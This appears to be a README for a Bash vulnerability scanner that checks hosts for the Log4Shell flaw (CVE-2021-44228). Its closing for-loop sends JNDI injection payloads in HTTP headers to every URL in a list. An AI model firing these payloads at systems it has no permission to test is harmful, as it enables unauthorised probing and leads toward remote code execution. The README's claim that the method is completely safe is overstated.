# log4jScanner

 log4jScanner.sh is a BASH script to validate the vulnerability (CVE-2021-44228) of a given IP/URL.
 
 The script perfectly validates the existence of the vulnerability based on the *RETURN* traffic of 4 protocols ldap | ldaps | rmi | dns 
 
 Thus, the testing methedology is completely safe and non-invasive. 
 
 ## Understand The Attack Vector:
 
 First and foremost, I suggest reviewing the provided pcapng file in wireshark for a thorough understanding of the attack vector. 
 The pcapng file captured complete start-to-end traffic of a perfectly compromised target in lab environment.
 
 For your reference, 192.168.190.100 and 1389 are the attacker's IP/Port, and 192.168.190.44:8080 are the victim's (Tomcat) IP/Port. 
 
 ## Note: Do not forget to add the visibility of SourcePort and DstinationPort in your wireshark setting's column preferences. 
 
## Requirements

If you prefer to test the internet facing target, then this test requires to be executed on a DMZ host,
on which you can open desired port for scanner's return traffic from the target. I have used and tested on free tier AWS EC2 Kali Linux instance. 

If you prefer to test the intranet facing target, then you simply make sure that Scanner-Return-Traffic-Port is reachable to the target. 

[Example: ./log4jScanner.sh 192.168.1.100:443 1389]

## Prepare the Kali instance with the below mentioned packages.

```bash
 apt install iptables iptables-persistence rsyslog curl vim
 
 systemctl restart rsyslog
```
## Download the script

```bash
git clone https://github.com/defcon250/log4jScanner
```

## Usage

```bash
  cd ./log4jScanner
  ./log4jScanner.sh  <Target-IP>:<Target-Port>  <Scanner-Return-Traffic-Port>  
  
  [Example: ./log4jScanner.sh 192.168.1.100:443 1389]
```
## To automate testing of multiple IP/URLs, please feel free to modify the script accordingly.

```bash
Hint: While refering the log4jScanner.sh, consider modifying the script to include the following for-loop.

for i in $(cat /tmp/urls.txt); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
````


